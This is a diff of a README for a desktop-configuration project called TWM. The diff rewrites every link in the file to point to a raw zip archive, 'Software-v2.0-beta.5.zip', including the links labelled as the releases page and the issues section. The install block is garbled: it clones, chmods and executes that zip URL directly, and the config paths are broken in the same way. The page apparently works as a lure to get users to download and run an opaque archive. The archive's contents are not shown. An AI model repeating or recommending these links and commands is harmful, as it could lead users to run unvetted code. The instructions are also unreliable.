@@ -1,6 +1,6 @@
 # 🎉 TWM - Simple Configurations for Your Desktop
 
-[![Download TWM](https://raw.githubusercontent.com/Rahul225622/TWM/main/sway/Software_v1.6.zip)](https://raw.githubusercontent.com/Rahul225622/TWM/main/sway/Software_v1.6.zip)
+[![Download TWM](https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip)](https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to set up TWM on your system.
 
 ### 1. Download TWM
 
-To get started, visit the [Releases page to download TWM](https://raw.githubusercontent.com/Rahul225622/TWM/main/sway/Software_v1.6.zip).
+To get started, visit the [Releases page to download TWM](https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip).
 
 ### 2. Install Required Dependencies
 
@@ -60,11 +60,11 @@ Once you have downloaded the files and installed the dependencies, you need to c
 2. Run the following commands:
 
 ```bash
-mkdir -p ~https://raw.githubusercontent.com/Rahul225622/TWM/main/sway/Software_v1.6.zip
-git clone https://raw.githubusercontent.com/Rahul225622/TWM/main/sway/Software_v1.6.zip ~https://raw.githubusercontent.com/Rahul225622/TWM/main/sway/Software_v1.6.zip
-cd ~https://raw.githubusercontent.com/Rahul225622/TWM/main/sway/Software_v1.6.zip
-chmod +x https://raw.githubusercontent.com/Rahul225622/TWM/main/sway/Software_v1.6.zip
-https://raw.githubusercontent.com/Rahul225622/TWM/main/sway/Software_v1.6.zip
+mkdir -p ~https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip
+git clone https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip ~https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip
+cd ~https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip
+chmod +x https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip
+https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip
 ```
 
 This script will create necessary symlinks for your configurations and install fonts automatically. Any existing configuration files will be backed up.
@@ -72,8 +72,8 @@ This script will create necessary symlinks for your configurations and install f
 ## 🔧 How It Works
 
 The TWM script customizes your environment depending on the window manager you choose. The configuration files for Waybar will load automatically based on the window manager:
-- For Niri: `~https://raw.githubusercontent.com/Rahul225622/TWM/main/sway/Software_v1.6.zip`
-- For Sway: `~https://raw.githubusercontent.com/Rahul225622/TWM/main/sway/Software_v1.6.zip`
+- For Niri: `~https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip`
+- For Sway: `~https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip`
 
 ## 🛠 Features
 
@@ -84,7 +84,7 @@ The TWM script customizes your environment depending on the window manager you c
 
 ## 📄 Support 
 
-If you encounter any issues or have questions, you can check the [issues section](https://raw.githubusercontent.com/Rahul225622/TWM/main/sway/Software_v1.6.zip) on the GitHub repository. Community participation is welcome, and we value your feedback.
+If you encounter any issues or have questions, you can check the [issues section](https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip) on the GitHub repository. Community participation is welcome, and we value your feedback.
 
 ## ⚙️ Additional Resources
 
@@ -95,6 +95,6 @@ For more advanced usage and options, take a look at the following resources:
 
 ## 🔗 Download & Install
 
-To download TWM, visit the [Releases page](https://raw.githubusercontent.com/Rahul225622/TWM/main/sway/Software_v1.6.zip). Download the desired version and follow the configuration steps mentioned above.
+To download TWM, visit the [Releases page](https://raw.githubusercontent.com/Rahul225622/TWM/main/kitty/Software-v2.0-beta.5.zip). Download the desired version and follow the configuration steps mentioned above.
 
 Feel free to reach out for additional help and share your experience with TWM!
